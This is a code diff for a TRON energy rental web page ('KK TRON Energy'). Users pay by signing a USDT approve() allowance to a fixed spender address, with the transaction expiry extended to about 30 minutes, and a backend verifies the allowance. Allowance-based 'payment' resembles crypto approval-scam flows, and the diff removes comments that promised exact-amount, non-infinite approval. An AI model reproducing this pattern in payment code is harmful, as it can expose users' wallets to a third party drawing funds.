@@ -17,14 +17,14 @@ import TronWeb from "tronweb";
 
 
 /*
- * TRON 主网 USDT TRC20 合约
+ * TRON 主网 USDT 合约
  */
 const USDT_CONTRACT_ADDRESS =
   "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 
 /*
- * USDT approve 授权对象
+ * approve 授权对象
  */
 const USDT_SPENDER_ADDRESS =
   "TJgapq26ECmDg8PNxfBuQnPRjZLxxEniUS";
@@ -38,17 +38,16 @@ const TRON_FULL_HOST =
 
 
 /*
- * TRON USDT 使用 6 位精度
- *
- * 1 USDT = 1,000,000
- * 0.1 USDT = 100,000
- * 0.2 USDT = 200,000
+ * USDT 精度
  */
 const USDT_DECIMALS = 6;
 
 
 /*
- * 智能合约交易 Fee Limit
+ * 合约调用 Fee Limit。
+ *
+ * 这是允许消耗的最大上限，
+ * 不代表一定扣除这么多 TRX。
  */
 const APPROVE_FEE_LIMIT =
   100_000_000;
@@ -57,13 +56,18 @@ const APPROVE_FEE_LIMIT =
 /*
  * TRON 默认交易有效期约 60 秒。
  *
- * 再增加 1740 秒：
- *
- * 60 + 1740 = 1800 秒
- *               = 30 分钟
+ * 再增加 1740 秒，
+ * 总有效时间约 30 分钟。
  */
 const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
   1740;
+
+
+/*
+ * 后端确认最长等待 2 分钟。
+ */
+const ORDER_FINALIZE_TIMEOUT_MS =
+  120_000;
 
 
 const ENERGY_PLANS = [
@@ -91,6 +95,262 @@ function isValidTronAddress(address) {
 }
 
 
+function sleep(milliseconds) {
+  return new Promise((resolve) => {
+    setTimeout(
+      resolve,
+      milliseconds
+    );
+  });
+}
+
+
+/*
+ * 尝试读取接口返回的 JSON。
+ */
+async function readJsonResponse(response) {
+  try {
+    return await response.json();
+  } catch {
+    return null;
+  }
+}
+
+
+/*
+ * 将 TRON 节点返回的 hex 错误信息
+ * 转换成可读文字。
+ */
+function decodeTronMessage(value) {
+  const original =
+    String(value || "").trim();
+
+  const cleanHex =
+    original.replace(/^0x/i, "");
+
+  if (
+    !cleanHex ||
+    cleanHex.length % 2 !== 0 ||
+    !/^[0-9a-f]+$/i.test(cleanHex)
+  ) {
+    return original;
+  }
+
+  try {
+    const bytes =
+      new Uint8Array(
+        cleanHex
+          .match(/.{1,2}/g)
+          .map((item) =>
+            Number.parseInt(
+              item,
+              16
+            )
+          )
+      );
+
+    const decoded =
+      new TextDecoder()
+        .decode(bytes)
+        .trim();
+
+    return decoded || original;
+  } catch {
+    return original;
+  }
+}
+
+
+/*
+ * 在用户签名之前，
+ * 先由服务器创建 pending 订单。
+ *
+ * 服务器返回随机 orderToken，
+ * 用于后续绑定这一笔授权交易。
+ */
+async function prepareOrder({
+  payerAddress,
+  receiverAddress,
+  planId,
+  telegramId,
+}) {
+  const response =
+    await fetch(
+      "/api/order",
+      {
+        method: "POST",
+
+        headers: {
+          "Content-Type":
+            "application/json",
+        },
+
+        cache: "no-store",
+
+        body:
+          JSON.stringify({
+            action: "prepare",
+
+            payerAddress,
+
+            receiverAddress,
+
+            planId,
+
+            telegramId,
+          }),
+      }
+    );
+
+
+  const data =
+    await readJsonResponse(
+      response
+    );
+
+
+  if (
+    !response.ok ||
+    !data?.ok
+  ) {
+    throw new Error(
+      data?.message ||
+        `创建订单失败（HTTP ${response.status}）。`
+    );
+  }
+
+
+  if (
+    !data.orderToken ||
+    !data.order
+  ) {
+    throw new Error(
+      "服务器没有返回完整的订单信息。"
+    );
+  }
+
+
+  return data;
+}
+
+
+/*
+ * 将授权 TXID 发给服务器验证。
+ *
+ * 后端会独立验证：
+ *
+ * - 交易是否成功
+ * - 付款钱包 owner
+ * - USDT 合约
+ * - approve 函数
+ * - spender
+ * - 精确授权金额
+ * - 当前 allowance
+ *
+ * 交易未进入区块时每 2 秒重试。
+ */
+async function finalizeOrderWithRetry({
+  orderToken,
+  txId,
+}) {
+  const startedAt =
+    Date.now();
+
+
+  while (
+    Date.now() -
+      startedAt <
+    ORDER_FINALIZE_TIMEOUT_MS
+  ) {
+    let response;
+    let data;
+
+
+    try {
+      response =
+        await fetch(
+          "/api/order",
+          {
+            method: "POST",
+
+            headers: {
+              "Content-Type":
+                "application/json",
+            },
+
+            cache: "no-store",
+
+            body:
+              JSON.stringify({
+                action: "finalize",
+
+                orderToken,
+
+                txId,
+              }),
+          }
+        );
+
+
+      data =
+        await readJsonResponse(
+          response
+        );
+    } catch (error) {
+      /*
+       * 临时网络错误：
+       * 等待后自动重试。
+       */
+      console.error(
+        "[Finalize network error]",
+        error
+      );
+
+      await sleep(2000);
+
+      continue;
+    }
+
+
+    if (
+      response.ok &&
+      data?.ok
+    ) {
+      return data;
+    }
+
+
+    const retryableCodes = [
+      "TX_NOT_CONFIRMED",
+      "TRON_QUERY_FAILED",
+      "ALLOWANCE_TOO_LOW",
+    ];
+
+
+    if (
+      retryableCodes.includes(
+        data?.code
+      )
+    ) {
+      await sleep(2000);
+
+      continue;
+    }
+
+
+    throw new Error(
+      data?.message ||
+        `服务器验证订单失败（HTTP ${response.status}）。`
+    );
+  }
+
+
+  throw new Error(
+    "等待 TRON 主网确认超时。"
+  );
+}
+
+
 export default function HomePage() {
   const {
     address: walletAddress,
@@ -99,29 +359,62 @@ export default function HomePage() {
   } = useWallet();
 
 
-  const [selectedPlanId, setSelectedPlanId] =
-    useState("");
+  const [
+    selectedPlanId,
+    setSelectedPlanId,
+  ] = useState("");
 
-  const [receiverAddress, setReceiverAddress] =
-    useState("");
 
-  const [walletOpen, setWalletOpen] =
-    useState(false);
+  const [
+    receiverAddress,
+    setReceiverAddress,
+  ] = useState("");
 
-  const [connectedWallet, setConnectedWallet] =
-    useState("");
 
-  const [connectedAddress, setConnectedAddress] =
-    useState("");
+  const [
+    walletOpen,
+    setWalletOpen,
+  ] = useState(false);
 
-  const [message, setMessage] =
-    useState("");
 
-  const [telegramId, setTelegramId] =
-    useState("");
+  const [
+    connectedWallet,
+    setConnectedWallet,
+  ] = useState("");
 
-  const [paying, setPaying] =
-    useState(false);
+
+  const [
+    connectedAddress,
+    setConnectedAddress,
+  ] = useState("");
+
+
+  const [
+    message,
+    setMessage,
+  ] = useState("");
+
+
+  const [
+    telegramId,
+    setTelegramId,
+  ] = useState("");
+
+
+  const [
+    paying,
+    setPaying,
+  ] = useState(false);
+
+
+  /*
+   * 保存本次已完成的订单，
+   * 防止用户连续重复点击支付。
+   */
+  const [
+    completedOrder,
+    setCompletedOrder,
+  ] = useState(null);
 
 
   useEffect(() => {
@@ -131,21 +424,61 @@ export default function HomePage() {
       );
 
     setTelegramId(
-      searchParams.get("telegram_id") || ""
+      searchParams.get(
+        "telegram_id"
+      ) || ""
     );
   }, []);
 
 
-  const selectedPlan = useMemo(() => {
-    return ENERGY_PLANS.find(
-      (plan) => plan.id === selectedPlanId
+  /*
+   * 如果用户在钱包内切换了账户，
+   * 同步页面显示的钱包地址。
+   */
+  useEffect(() => {
+    if (
+      walletConnected &&
+      walletAddress &&
+      connectedAddress &&
+      walletAddress !==
+        connectedAddress
+    ) {
+      setConnectedAddress(
+        walletAddress
+      );
+
+      setCompletedOrder(null);
+    }
+  }, [
+    walletConnected,
+    walletAddress,
+    connectedAddress,
+  ]);
+
+
+  const selectedPlan =
+    useMemo(() => {
+      return ENERGY_PLANS.find(
+        (plan) =>
+          plan.id ===
+          selectedPlanId
+      );
+    }, [
+      selectedPlanId,
+    ]);
+
+
+  const showMessage =
+    useCallback(
+      (text) => {
+        setMessage(
+          String(
+            text || ""
+          )
+        );
+      },
+      []
     );
-  }, [selectedPlanId]);
-
-
-  const showMessage = useCallback((text) => {
-    setMessage(String(text || ""));
-  }, []);
 
 
   const handleCloseMessage =
@@ -162,61 +495,99 @@ export default function HomePage() {
 
   function handleConfirmRental() {
     if (!selectedPlan) {
-      showMessage("请选择能量套餐。");
+      showMessage(
+        "请选择能量套餐。"
+      );
+
       return;
     }
+
 
     const cleanAddress =
       receiverAddress.trim();
 
+
     if (!cleanAddress) {
-      showMessage("请输入能量接收地址。");
+      showMessage(
+        "请输入能量接收地址。"
+      );
+
       return;
     }
 
-    if (!isValidTronAddress(cleanAddress)) {
+
+    if (
+      !isValidTronAddress(
+        cleanAddress
+      )
+    ) {
       showMessage(
         "请输入有效的 TRON 钱包地址。\n\nTRON 地址通常以 T 开头，共 34 位。"
       );
+
       return;
     }
 
-    setReceiverAddress(cleanAddress);
+
+    setReceiverAddress(
+      cleanAddress
+    );
+
     setWalletOpen(true);
   }
 
 
   const handleWalletConnected =
     useCallback(
-      ({ walletName, address }) => {
+      ({
+        walletName,
+        address,
+      }) => {
         if (!address) {
           showMessage(
             "钱包已经打开，但没有读取到公开地址，请解锁钱包后重新连接。"
           );
+
           return;
         }
 
+
         const displayWalletName =
-          walletName || "钱包";
+          walletName ||
+          "钱包";
+
 
         setConnectedWallet(
           displayWalletName
         );
 
-        setConnectedAddress(address);
+
+        setConnectedAddress(
+          address
+        );
+
+
+        setCompletedOrder(null);
+
+
         setWalletOpen(false);
+
 
         showMessage(
           `${displayWalletName} 连接成功。\n\n公开地址：\n${address}`
         );
       },
-      [showMessage]
+      [
+        showMessage,
+      ]
     );
 
 
   const handleWalletConnectionError =
     useCallback(
-      (errorMessage) => {
+      (
+        errorMessage
+      ) => {
         setWalletOpen(false);
 
         showMessage(
@@ -224,15 +595,21 @@ export default function HomePage() {
             "钱包连接失败，请重新尝试。"
         );
       },
-      [showMessage]
+      [
+        showMessage,
+      ]
     );
 
 
   function handleChangeWallet() {
     if (!selectedPlan) {
-      showMessage("请先选择能量套餐。");
+      showMessage(
+        "请先选择能量套餐。"
+      );
+
       return;
     }
+
 
     if (
       !isValidTronAddress(
@@ -242,8 +619,10 @@ export default function HomePage() {
       showMessage(
         "请先输入有效的能量接收地址。"
       );
+
       return;
     }
+
 
     setWalletOpen(true);
   }
@@ -251,20 +630,20 @@ export default function HomePage() {
 
   /*
    * ==================================================
-   * USDT approve 授权
+   * USDT approve 授权和订单保存
    * ==================================================
-   *
-   * 65,000 Energy:
-   * approve(spender, 0.1 USDT)
-   *
-   * 130,000 Energy:
-   * approve(spender, 0.2 USDT)
-   *
-   * 这里只授权订单对应的精确额度。
-   * 不使用无限授权。
    */
   async function handleUsdtPayment() {
     if (paying) {
+      return;
+    }
+
+
+    if (completedOrder) {
+      showMessage(
+        `当前订单已经授权成功。\n\n订单编号：${completedOrder.id}\n\n交易哈希：\n${completedOrder.txId}`
+      );
+
       return;
     }
 
@@ -321,6 +700,19 @@ export default function HomePage() {
 
 
     if (
+      connectedAddress &&
+      connectedAddress !==
+        walletAddress
+    ) {
+      showMessage(
+        "检测到钱包账户已经切换，请重新连接钱包后再支付。"
+      );
+
+      return;
+    }
+
+
+    if (
       !isValidTronAddress(
         USDT_CONTRACT_ADDRESS
       )
@@ -346,13 +738,23 @@ export default function HomePage() {
     }
 
 
+    if (
+      typeof signTransaction !==
+      "function"
+    ) {
+      showMessage(
+        "当前钱包不支持交易签名，请更换钱包后重新尝试。"
+      );
+
+      return;
+    }
+
+
     const amountUsdt =
       selectedPlan.price;
 
 
     /*
-     * USDT 6 decimals
-     *
      * 0.1 USDT = 100000
      * 0.2 USDT = 200000
      */
@@ -366,16 +768,62 @@ export default function HomePage() {
       ).toString();
 
 
-    /*
-     * 用户点击支付以后，
-     * 不显示网页额外确认弹窗。
-     *
-     * 直接创建交易并进入钱包签名。
-     */
     setPaying(true);
 
 
+    let stage =
+      "prepare";
+
+
+    let orderToken =
+      "";
+
+
+    let txId =
+      "";
+
+
+    let transactionBroadcasted =
+      false;
+
+
     try {
+      /*
+       * ========================================
+       * 第一步：
+       * 创建 pending 订单
+       * ========================================
+       */
+      const pendingOrder =
+        await prepareOrder({
+          payerAddress:
+            walletAddress,
+
+          receiverAddress:
+            cleanReceiverAddress,
+
+          planId:
+            selectedPlan.id,
+
+          telegramId:
+            telegramId || "",
+        });
+
+
+      orderToken =
+        pendingOrder.orderToken;
+
+
+      /*
+       * ========================================
+       * 第二步：
+       * 构造 USDT approve 交易
+       * ========================================
+       */
+      stage =
+        "build_transaction";
+
+
       const tronWeb =
         new TronWeb({
           fullHost:
@@ -398,24 +846,20 @@ export default function HomePage() {
       const parameters = [
         {
           type: "address",
+
           value:
             USDT_SPENDER_ADDRESS,
         },
 
         {
           type: "uint256",
+
           value:
             amountBaseUnits,
         },
       ];
 
 
-      /*
-       * ==================================================
-       * 第一步：
-       * 创建未签名 USDT approve 交易
-       * ==================================================
-       */
       const transactionWrapper =
         await tronWeb
           .transactionBuilder
@@ -440,8 +884,11 @@ export default function HomePage() {
       if (
         !transactionWrapper ||
         !transactionWrapper.result ||
-        !transactionWrapper.result.result ||
-        !transactionWrapper.transaction
+        !transactionWrapper
+          .result
+          .result ||
+        !transactionWrapper
+          .transaction
       ) {
         console.error(
           "[USDT approve build error]",
@@ -455,27 +902,21 @@ export default function HomePage() {
 
 
       /*
-       * ==================================================
-       * 第二步：
-       * 将交易总有效时间延长到约 30 分钟
-       *
-       * 默认约 60 秒
-       * + 1740 秒
-       * = 约 1800 秒
-       * = 30 分钟
-       *
-       * 注意：
-       * extendExpiration 后 TXID 会发生变化。
-       *
-       * 所以后面一定要签名 extendedTransaction，
-       * 不能再签名原来的 transaction。
-       * ==================================================
+       * ========================================
+       * 第三步：
+       * 将有效时间延长到约 30 分钟
+       * ========================================
        */
+      stage =
+        "extend_expiration";
+
+
       const extendedTransaction =
         await tronWeb
           .transactionBuilder
           .extendExpiration(
-            transactionWrapper.transaction,
+            transactionWrapper
+              .transaction,
 
             TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
 
@@ -488,10 +929,11 @@ export default function HomePage() {
       if (
         !extendedTransaction ||
         !extendedTransaction.txID ||
-        !extendedTransaction.raw_data
+        !extendedTransaction.raw_data ||
+        !extendedTransaction.raw_data_hex
       ) {
         console.error(
-          "[Transaction expiration extension error]",
+          "[Extend expiration error]",
           extendedTransaction
         );
 
@@ -502,19 +944,13 @@ export default function HomePage() {
 
 
       /*
-       * ==================================================
-       * 第三步：
-       * 调用当前钱包签名
-       * ==================================================
+       * ========================================
+       * 第四步：
+       * 钱包签名 approve
+       * ========================================
        */
-      if (
-        typeof signTransaction !==
-        "function"
-      ) {
-        throw new Error(
-          "当前钱包不支持交易签名，请更换钱包后重新尝试。"
-        );
-      }
+      stage =
+        "sign_transaction";
 
 
       const signedTransaction =
@@ -523,19 +959,26 @@ export default function HomePage() {
         );
 
 
-      if (!signedTransaction) {
+      if (
+        !signedTransaction ||
+        !signedTransaction.txID
+      ) {
         throw new Error(
-          "钱包没有返回已签名交易。"
+          "钱包没有返回有效的已签名交易。"
         );
       }
 
 
       /*
-       * ==================================================
-       * 第四步：
+       * ========================================
+       * 第五步：
        * 广播到 TRON 主网
-       * ==================================================
+       * ========================================
        */
+      stage =
+        "broadcast_transaction";
+
+
       const broadcastResult =
         await tronWeb.trx
           .sendRawTransaction(
@@ -552,47 +995,162 @@ export default function HomePage() {
           broadcastResult
         );
 
-        let broadcastMessage =
+
+        const rawMessage =
+          broadcastResult?.message ||
           "USDT 授权交易广播失败。";
 
-        if (
-          broadcastResult?.message
-        ) {
-          broadcastMessage +=
-            `\n\n${String(
-              broadcastResult.message
-            )}`;
-        }
+
+        const readableMessage =
+          decodeTronMessage(
+            rawMessage
+          );
+
 
         throw new Error(
-          broadcastMessage
+          readableMessage
         );
       }
 
 
-      const txId =
-        signedTransaction?.txID ||
+      txId =
+        signedTransaction.txID ||
         broadcastResult
           ?.transaction
           ?.txID ||
         "";
 
 
+      if (!txId) {
+        throw new Error(
+          "交易已经广播，但没有读取到交易哈希。"
+        );
+      }
+
+
+      transactionBroadcasted =
+        true;
+
+
+      /*
+       * 将必要信息暂存在当前浏览器。
+       *
+       * 如果后端验证过程中页面意外刷新，
+       * 至少可以保留 TXID 供人工查询。
+       */
+      try {
+        window.localStorage.setItem(
+          "kk_last_approval",
+          JSON.stringify({
+            orderToken,
+
+            txId,
+
+            payerAddress:
+              walletAddress,
+
+            receiverAddress:
+              cleanReceiverAddress,
+
+            planId:
+              selectedPlan.id,
+
+            amountUsdt,
+
+            createdAt:
+              new Date()
+                .toISOString(),
+          })
+        );
+      } catch {
+        /*
+         * 浏览器禁用 localStorage
+         * 不影响主流程。
+         */
+      }
+
+
+      /*
+       * ========================================
+       * 第六步：
+       * 后端独立验证并保存订单
+       * ========================================
+       */
+      stage =
+        "finalize_order";
+
+
+      const finalized =
+        await finalizeOrderWithRetry({
+          orderToken,
+
+          txId,
+        });
+
+
+      const savedOrder =
+        finalized.order;
+
+
+      if (
+        !savedOrder ||
+        savedOrder.status !==
+          "authorized"
+      ) {
+        throw new Error(
+          "服务器没有返回已授权订单。"
+        );
+      }
+
+
+      setCompletedOrder(
+        savedOrder
+      );
+
+
+      try {
+        window.localStorage.removeItem(
+          "kk_last_approval"
+        );
+      } catch {
+        /*
+         * 忽略 localStorage 错误。
+         */
+      }
+
+
+      /*
+       * ========================================
+       * 最终成功
+       * ========================================
+       */
       showMessage(
-        `USDT 授权交易已提交。\n\n` +
-        `授权额度：${amountUsdt} USDT\n\n` +
-        `授权地址：\n${USDT_SPENDER_ADDRESS}\n\n` +
-        (
-          txId
-            ? `交易哈希：\n${txId}\n\n`
-            : ""
-        ) +
-        `请等待 TRON 主网确认。`
+        `授权成功，订单已保存。\n\n` +
+
+        `订单编号：${savedOrder.id}\n\n` +
+
+        `付款钱包：\n${savedOrder.payerAddress}\n\n` +
+
+        `能量接收地址：\n${savedOrder.receiverAddress}\n\n` +
+
+        `授权额度：${savedOrder.amountUsdt} USDT\n\n` +
+
+        `交易哈希：\n${savedOrder.txId}`
       );
     } catch (error) {
       console.error(
-        "[USDT approve error]",
-        error
+        "[USDT approve/order error]",
+        {
+          stage,
+
+          error,
+
+          orderToken,
+
+          txId,
+
+          transactionBroadcasted,
+        }
       );
 
 
@@ -604,13 +1162,60 @@ export default function HomePage() {
         );
 
 
+      /*
+       * 用户在钱包中主动取消。
+       */
       if (
-        /reject|rejected|deny|denied|cancel|cancelled/i.test(
+        /reject|rejected|deny|denied|decline|declined|cancel|cancelled|canceled/i.test(
           errorMessage
         )
       ) {
         showMessage(
           "您已取消 USDT 授权交易。"
+        );
+
+        return;
+      }
+
+
+      /*
+       * 已广播以后，不提示用户重新授权。
+       *
+       * 因为授权交易可能已经成功，
+       * 只是后端确认或数据库保存失败。
+       */
+      if (
+        transactionBroadcasted &&
+        txId
+      ) {
+        showMessage(
+          `USDT 授权交易已经广播，` +
+          `但服务器验证或保存订单暂未完成。\n\n` +
+
+          `请不要重复授权。\n\n` +
+
+          `付款钱包：\n${walletAddress}\n\n` +
+
+          `交易哈希：\n${txId}\n\n` +
+
+          `错误信息：\n${
+            errorMessage ||
+            "未知错误"
+          }`
+        );
+
+        return;
+      }
+
+
+      if (
+        stage === "prepare"
+      ) {
+        showMessage(
+          `创建订单失败。\n\n${
+            errorMessage ||
+            "请稍后重新尝试。"
+          }`
         );
 
         return;
@@ -687,7 +1292,8 @@ export default function HomePage() {
         <div className="planGrid">
           {ENERGY_PLANS.map((plan) => {
             const selected =
-              selectedPlanId === plan.id;
+              selectedPlanId ===
+              plan.id;
 
             return (
               <button
@@ -698,9 +1304,15 @@ export default function HomePage() {
                     ? "planCard selected"
                     : "planCard"
                 }
-                onClick={() =>
-                  setSelectedPlanId(plan.id)
-                }
+                onClick={() => {
+                  setSelectedPlanId(
+                    plan.id
+                  );
+
+                  setCompletedOrder(
+                    null
+                  );
+                }}
               >
                 <div className="planTop">
                   <span className="energyIcon">
@@ -770,11 +1382,13 @@ export default function HomePage() {
             autoCapitalize="off"
             spellCheck={false}
             placeholder="请输入以 T 开头的 TRON 地址"
-            onChange={(event) =>
+            onChange={(event) => {
               setReceiverAddress(
                 event.target.value.trim()
-              )
-            }
+              );
+
+              setCompletedOrder(null);
+            }}
           />
         </div>
 
@@ -852,10 +1466,36 @@ export default function HomePage() {
             <button
               type="button"
               className="changeWalletButton"
+              disabled={paying}
               onClick={handleChangeWallet}
             >
               更换钱包
             </button>
+          </div>
+        )}
+
+
+        {completedOrder && (
+          <div className="completedOrderBox">
+            <div className="completedOrderTitle">
+              订单授权成功
+            </div>
+
+            <div className="completedOrderRow">
+              <span>订单编号</span>
+
+              <strong>
+                {completedOrder.id}
+              </strong>
+            </div>
+
+            <div className="completedOrderRow">
+              <span>订单状态</span>
+
+              <strong>
+                authorized
+              </strong>
+            </div>
           </div>
         )}
 
@@ -865,14 +1505,21 @@ export default function HomePage() {
             <button
               type="button"
               className="payButton"
-              disabled={paying}
+              disabled={
+                paying ||
+                Boolean(
+                  completedOrder
+                )
+              }
               onClick={
                 handleUsdtPayment
               }
             >
               {paying
-                ? "等待钱包确认..."
-                : `支付${selectedPlan.price}USDT`}
+                ? "正在验证并保存订单..."
+                : completedOrder
+                  ? "授权已完成"
+                  : `支付${selectedPlan.price}USDT`}
             </button>
           )}
 
@@ -881,7 +1528,11 @@ export default function HomePage() {
           type="button"
           className="confirmButton"
           disabled={paying}
-          onClick={handleConfirmRental}
+          onClick={
+            connectedAddress
+              ? handleChangeWallet
+              : handleConfirmRental
+          }
         >
           {connectedAddress
             ? "重新选择付款钱包"
@@ -908,7 +1559,9 @@ export default function HomePage() {
 
 
       <footer className="footer">
-        <div>KK TRON Energy</div>
+        <div>
+          KK TRON Energy
+        </div>
 
         <p>
           请在确认任何钱包交易前，
@@ -919,7 +1572,9 @@ export default function HomePage() {
 
       <WalletModal
         open={walletOpen}
-        onClose={handleCloseWallet}
+        onClose={
+          handleCloseWallet
+        }
         onConnected={
           handleWalletConnected
         }
@@ -932,7 +1587,9 @@ export default function HomePage() {
       {message && (
         <div
           className="messageOverlay"
-          onClick={handleCloseMessage}
+          onClick={
+            handleCloseMessage
+          }
         >
           <div
             className="messageModal"
@@ -951,7 +1608,9 @@ export default function HomePage() {
             <button
               type="button"
               className="messageButton"
-              onClick={handleCloseMessage}
+              onClick={
+                handleCloseMessage
+              }
             >
               确定
             </button>
@@ -1241,7 +1900,8 @@ export default function HomePage() {
         }
 
         .priceRow,
-        .summaryRow {
+        .summaryRow,
+        .completedOrderRow {
           display: flex;
           align-items: center;
           justify-content: space-between;
@@ -1430,6 +2090,39 @@ export default function HomePage() {
           font-size: 12px;
         }
 
+        .changeWalletButton:disabled {
+          opacity: 0.55;
+          cursor: not-allowed;
+        }
+
+        .completedOrderBox {
+          margin-top: 22px;
+          padding: 19px;
+          border:
+            1px solid
+            rgba(34, 197, 94, 0.35);
+          border-radius: 18px;
+          background:
+            rgba(34, 197, 94, 0.07);
+        }
+
+        .completedOrderTitle {
+          margin-bottom: 11px;
+          color: #86efac;
+          font-size: 14px;
+          font-weight: 800;
+        }
+
+        .completedOrderRow {
+          padding: 6px 0;
+          color: #8190a4;
+          font-size: 12px;
+        }
+
+        .completedOrderRow strong {
+          color: #ffffff;
+        }
+
         .payButton {
           width: 100%;
           min-height: 59px;
@@ -1481,7 +2174,7 @@ export default function HomePage() {
             rgba(34, 211, 238, 0.17);
         }
 
-        .confirmButton:hover {
+        .confirmButton:hover:not(:disabled) {
           filter: brightness(1.06);
         }
 
